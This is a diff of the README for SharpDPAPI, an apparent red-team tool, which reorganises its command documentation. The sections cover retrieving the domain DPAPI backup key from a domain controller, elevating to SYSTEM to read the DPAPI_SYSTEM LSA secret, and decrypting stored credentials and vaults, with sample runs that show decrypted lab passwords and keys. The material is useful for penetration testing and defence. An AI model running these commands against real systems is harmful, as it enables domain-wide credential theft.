@@ -27,16 +27,19 @@ SharpDPAPI is licensed under the BSD 3-Clause license.
       - [SharpChrome](#sharpchrome)
     + [Cobalt Strike Usage](#cobalt-strike-usage)
   * [SharpDPAPI Commands](#sharpdpapi-commands)
-    + [backupkey](#backupkey)
-    + [masterkeys](#masterkeys)
-    + [machinemasterkeys](#machinemasterkeys)
-    + [credentials](#credentials)
-    + [machinecredentials](#machinecredentials)
-    + [vaults](#vaults)
-    + [machinevaults](#machinevaults)
-    + [rdg](#rdg)
-    + [triage](#triage)
-    + [machinetriage](#machinetriage)
+    + [User Triage](#user-triage)
+      - [masterkeys](#masterkeys)
+      - [credentials](#credentials)
+      - [vaults](#vaults)
+      - [rdg](#rdg)
+      - [triage](#triage)
+    + [Machine Triage](#machine-triage)
+      - [machinemasterkeys](#machinemasterkeys)
+      - [machinecredentials](#machinecredentials)
+      - [machinevaults](#machinevaults)
+      - [machinetriage](#machinetriage)
+    + [Misc](#misc)
+      - [backupkey](#backupkey)
   * [SharpChrome Commands](#sharpchrome-commands)
     + [logins](#logins)
     + [cookies](#cookies)
@@ -171,58 +174,9 @@ _TODO: implement machine key triage functions in SharpDPAPI.cna_
 
 ## SharpDPAPI Commands
 
-### backupkey
+### User Triage
 
-The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API approach [from Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927). This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)
-
-Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.
-
-This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob/file /pvk:X form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.
-
-By default, SharpDPAPI will try to determine the current domain controller via the **DsGetDcName** API call. A server can be specified with `/server:COMPUTER.domain.com`. If you want the key saved to disk instead of output as a base64 blob, use `/file:key.pvk`.
-
-Retrieve the DPAPI backup key for the current domain controller:
-
-    C:\Temp>SharpDPAPI.exe backupkey
-
-      __                 _   _       _ ___
-     (_  |_   _. ._ ._  | \ |_) /\  |_) |
-     __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                    |
-      v1.2.0
-
-
-    [*] Action: Retrieve domain DPAPI backup key
-
-
-    [*] Using current domain controller  : PRIMARY.testlab.local
-    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
-    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
-    [*] Key :
-              HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAA...(snip)...
-
-
-Retrieve the DPAPI backup key for the specified DC, outputting the backup key to a file:
-
-    C:\Temp>SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk
-
-      __                 _   _       _ ___
-     (_  |_   _. ._ ._  | \ |_) /\  |_) |
-     __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                    |
-      v1.2.0
-
-
-    [*] Action: Retrieve domain DPAPI backup key
-
-
-    [*] Using server                     : primary.testlab.local
-    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
-    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
-    [*] Backup key written to            : key.pvk
-
-
-### masterkeys
+#### masterkeys
 
 The **masterkeys** command will search for any readable user masterkey files and decrypt them using a supplied domain DPAPI backup key. It will return a set of masterkey {GUID}:SHA1 mappings.
 
@@ -249,38 +203,7 @@ The domain backup key can be in base64 form (`/pvk:BASE64...`) or file form (`/p
     ...(snip)...
 
 
-### machinemasterkeys
-
-The **machinemasterkeys** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.
-
-Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
-
-    C:\Temp>SharpDPAPI.exe machinemasterkeys
-
-      __                 _   _       _ ___
-     (_  |_   _. ._ ._  | \ |_) /\  |_) |
-     __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                    |
-      v1.2.0
-
-
-    [*] Action: Machine DPAPI Masterkey File Triage
-
-    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
-    [*] RevertToSelf()
-
-    [*] Secret  : DPAPI_SYSTEM
-    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
-    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
-
-
-    [*] SYSTEM master key cache:
-
-    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
-    ...(snip)...
-
-
-### credentials
+#### credentials
 
 The **credentials** command will search for Credential files and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, or c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.
 
@@ -367,65 +290,8 @@ Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:
     ...(snip)...
 
 
-### machinecredentials
 
-The **machinecredentials** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Credential files.
-
-Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
-
-    C:\Temp>SharpDPAPI.exe machinecredentials
-
-      __                 _   _       _ ___
-     (_  |_   _. ._ ._  | \ |_) /\  |_) |
-     __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                    |
-      v1.2.0
-
-
-    [*] Action: Machine DPAPI Credential Triage
-
-    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
-    [*] RevertToSelf()
-
-    [*] Secret  : DPAPI_SYSTEM
-    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
-    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
-
-    [*] SYSTEM master key cache:
-
-    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
-    ...(snip)...
-
-
-    [*] Triaging System Credentials
-
-
-    Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
-
-      CredFile           : C73A55F92FAE222C18A8989FEA28A1FE
-
-        guidMasterKey    : {1cb83cb5-96cd-445d-baac-49e97f4eeb72}
-        size             : 544
-        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
-        algHash/algCrypt : 32782/26128
-        description      : Local Credential Data
-
-        LastWritten      : 3/24/2019 7:08:43 PM
-        TargetName       : Domain:batch=TaskScheduler:Task:{B745BF75-D62D-4B1C-84ED-F0437214ECED}
-        TargetAlias      :
-        Comment          :
-        UserName         : TESTLAB\harmj0y
-        Credential       : Password123!
-
-
-    Folder       : C:\WINDOWS\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials
-
-      CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D
-
-        ...(snip)...
-
-
-### vaults
+#### vaults
 
 The **vaults** command will search for Vaults and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, or c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.
 
@@ -554,55 +420,7 @@ Using a domain DPAPI backup key with a folder specified (i.e. "offline" triage):
         Authenticator    : password
 
 
-### machinevaults
-
-The **machinevaults** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Vaults.
-
-Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
-
-    C:\Temp>SharpDPAPI.exe machinevaults
-
-      __                 _   _       _ ___
-     (_  |_   _. ._ ._  | \ |_) /\  |_) |
-     __) | | (_| |  |_) |_/ |  /--\ |  _|_
-                    |
-      v1.2.0
-
-
-    [*] Action: Machine DPAPI Vault Triage
-
-    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
-    [*] RevertToSelf()
-
-    [*] Secret  : DPAPI_SYSTEM
-    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
-    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
-
-    [*] SYSTEM master key cache:
-
-    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
-    ...(snip)...
-
-
-    [*] Triaging SYSTEM Vaults
-
-
-    [*] Triaging Vault folder: C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
-
-      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
-      Name               : Web Credentials
-        guidMasterKey    : {0bd732d9-c396-4f9a-a69a-508632c05235}
-        size             : 324
-        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
-        algHash/algCrypt : 32782/26128
-        description      :
-        aes128 key       : 74CE3D7BCC4D0C4734931041F6D00D09
-        aes256 key       : B497F57730A2F29C3533B76BD6B33EEA231C1F51ED933E0CA1210B9E3A16D081
-
-    ...(snip)...
-
-
-### rdg
+#### rdg
 
 The **rdg** command will search for RDCMan.settings files for the current user (or if elevated, all users) and either a) decrypt them with any "{GUID}:SHA1" masterkeys passed, b) a `/mkfile:FILE` of one or more {GUID}:SHA1 masterkey mappings, or c) use a supplied DPAPI domain backup key (`/pvk:BASE64...` or `/pvk:key.pvk`) to first decrypt any user masterkeys (a la **masterkeys**), which are then used as a lookup decryption table. DPAPI GUID mappings can be recovered with Mimikatz' `sekurlsa::dpapi` command.
 
@@ -755,14 +573,207 @@ Using a domain DPAPI backup key to first decrypt any discoverable masterkeys:
                 Password   : Password123!
 
 
-### triage
+#### triage
 
 The **triage** command runs the user [credentials](#credentials), [vaults](#vaults), and [rdg](#rdg) triage commands.
 
 
-### machinetriage
+### Machine Triage
+
+#### machinemasterkeys
+
+The **machinemasterkeys** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.
+
+Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
+
+    C:\Temp>SharpDPAPI.exe machinemasterkeys
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.2.0
+
+
+    [*] Action: Machine DPAPI Masterkey File Triage
+
+    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+    [*] RevertToSelf()
+
+    [*] Secret  : DPAPI_SYSTEM
+    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+
+
+    [*] SYSTEM master key cache:
+
+    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
+    ...(snip)...
+
+
+
+#### machinecredentials
+
+The **machinecredentials** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Credential files.
+
+Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
+
+    C:\Temp>SharpDPAPI.exe machinecredentials
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.2.0
+
+
+    [*] Action: Machine DPAPI Credential Triage
+
+    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+    [*] RevertToSelf()
+
+    [*] Secret  : DPAPI_SYSTEM
+    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+
+    [*] SYSTEM master key cache:
+
+    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
+    ...(snip)...
+
+
+    [*] Triaging System Credentials
+
+
+    Folder       : C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+      CredFile           : C73A55F92FAE222C18A8989FEA28A1FE
+
+        guidMasterKey    : {1cb83cb5-96cd-445d-baac-49e97f4eeb72}
+        size             : 544
+        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+        algHash/algCrypt : 32782/26128
+        description      : Local Credential Data
+
+        LastWritten      : 3/24/2019 7:08:43 PM
+        TargetName       : Domain:batch=TaskScheduler:Task:{B745BF75-D62D-4B1C-84ED-F0437214ECED}
+        TargetAlias      :
+        Comment          :
+        UserName         : TESTLAB\harmj0y
+        Credential       : Password123!
+
+
+    Folder       : C:\WINDOWS\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials
+
+      CredFile           : DFBE70A7E5CC19A398EBF1B96859CE5D
+
+        ...(snip)...
+
+
+#### machinevaults
+
+The **machinevaults** command will elevated to SYSTEM to retrieve the DPAPI_SYSTEM LSA secret which is then used to decrypt any found machine DPAPI masterkeys. These keys are then used to decrypt any found machine Vaults.
+
+Local administrative rights are needed (so we can retrieve the DPAPI_SYSTEM LSA secret).
+
+    C:\Temp>SharpDPAPI.exe machinevaults
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.2.0
+
+
+    [*] Action: Machine DPAPI Vault Triage
+
+    [*] Elevating to SYSTEM via token duplication for LSA secret retrieval
+    [*] RevertToSelf()
+
+    [*] Secret  : DPAPI_SYSTEM
+    [*]    full: DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+    [*]    m/u : DBA60EB802B6C4B42E1E450BB5781EBD0846E1BF / 6C88CEFD23D0291FA9FE46899D4DE12A180E76C3
+
+    [*] SYSTEM master key cache:
+
+    {1e76e1ee-1c53-4350-9a3d-7dec7afd024a}:4E4193B4C4D2F0420E0656B5F83D03754B565A0C
+    ...(snip)...
+
+
+    [*] Triaging SYSTEM Vaults
+
+
+    [*] Triaging Vault folder: C:\WINDOWS\System32\config\systemprofile\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28
+
+      VaultID            : 4bf4c442-9b8a-41a0-b380-dd4a704ddb28
+      Name               : Web Credentials
+        guidMasterKey    : {0bd732d9-c396-4f9a-a69a-508632c05235}
+        size             : 324
+        flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+        algHash/algCrypt : 32782/26128
+        description      :
+        aes128 key       : 74CE3D7BCC4D0C4734931041F6D00D09
+        aes256 key       : B497F57730A2F29C3533B76BD6B33EEA231C1F51ED933E0CA1210B9E3A16D081
+
+    ...(snip)...
+
+
+#### machinetriage
 
 The **machinetriage** command runs the user [machinecredentials](#machinecredentials) and [machinevaults](#machinevaults) triage commands.
+
+
+### Misc
+
+#### backupkey
+
+The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using the **LsaRetrievePrivateData** API approach [from Mimikatz](https://github.com/gentilkiwi/mimikatz/blob/2fd09bbef0754317cd97c01dbbf49698ae23d9d2/mimikatz/modules/kuhl_m_lsadump.c#L1882-L1927). This private key can then be used to decrypt master key blobs for any user on the domain. And even better, the key never changes ;)
+
+Domain admin (or equivalent) rights are needed to retrieve the key from a remote domain controller.
+
+This base64 key blob can be decoded to a binary .pvk file that can then be used with Mimikatz' **dpapi::masterkey /in:MASTERKEY /pvk:backupkey.pvk** module, or used in blob/file /pvk:X form with the **masterkeys**, **credentials**, or **vault** SharpDPAPI commands.
+
+By default, SharpDPAPI will try to determine the current domain controller via the **DsGetDcName** API call. A server can be specified with `/server:COMPUTER.domain.com`. If you want the key saved to disk instead of output as a base64 blob, use `/file:key.pvk`.
+
+Retrieve the DPAPI backup key for the current domain controller:
+
+    C:\Temp>SharpDPAPI.exe backupkey
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.2.0
+
+
+    [*] Action: Retrieve domain DPAPI backup key
+
+
+    [*] Using current domain controller  : PRIMARY.testlab.local
+    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
+    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
+    [*] Key :
+              HvG1sAAAAAABAAAAAAAAAAAAAACUBAAABwIAAACkAABSU0EyAAgAAA...(snip)...
+
+
+Retrieve the DPAPI backup key for the specified DC, outputting the backup key to a file:
+
+    C:\Temp>SharpDPAPI.exe backupkey /server:primary.testlab.local /file:key.pvk
+
+      __                 _   _       _ ___
+     (_  |_   _. ._ ._  | \ |_) /\  |_) |
+     __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                    |
+      v1.2.0
+
+
+    [*] Action: Retrieve domain DPAPI backup key
+
+
+    [*] Using server                     : primary.testlab.local
+    [*] Preferred backupkey Guid         : 32d021e7-ab1c-4877-af06-80473ca3e4d8
+    [*] Full preferred backupKeyName     : G$BCKUPKEY_32d021e7-ab1c-4877-af06-80473ca3e4d8
+    [*] Backup key written to            : key.pvk
 
 
 ## SharpChrome Commands
